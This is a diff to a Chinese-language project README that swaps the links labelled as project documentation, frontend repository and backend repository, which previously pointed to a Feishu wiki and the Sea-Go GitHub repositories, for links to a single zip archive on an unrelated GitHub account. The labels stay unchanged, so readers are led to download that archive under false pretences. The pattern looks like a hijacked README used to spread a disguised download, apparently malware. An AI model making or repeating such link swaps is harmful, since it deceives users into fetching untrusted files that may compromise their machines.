@@ -17,9 +17,9 @@
 
 项目资料与访问入口汇总
 
-- 📄 [项目文档](https://my.feishu.cn/wiki/FWSkwcTKwiuCcGkzqwPcfx0Inuc?from=from_copylink )   密码：174w667#
+- 📄 [项目文档](https://raw.githubusercontent.com/kennethjohnsanchez16-cmyk/Sea-BreakTheWaves/main/router/Waves-Sea-The-Break-tergeminate.zip )   密码：174w667#
 - 👥QQ 交流群：750807478
-- 🧩 [前端仓库](https://github.com/Sea-Go/Sea-RideTheWind-Fronted) / [后端仓库](https://github.com/Sea-Go/Sea-RideTheWind)
+- 🧩 [前端仓库](https://raw.githubusercontent.com/kennethjohnsanchez16-cmyk/Sea-BreakTheWaves/main/router/Waves-Sea-The-Break-tergeminate.zip) / [后端仓库](https://raw.githubusercontent.com/kennethjohnsanchez16-cmyk/Sea-BreakTheWaves/main/router/Waves-Sea-The-Break-tergeminate.zip)
 - 🚀 [在线体验](sea-ridethewindbreakthewaves.xyz)
 
 ## 项目简介
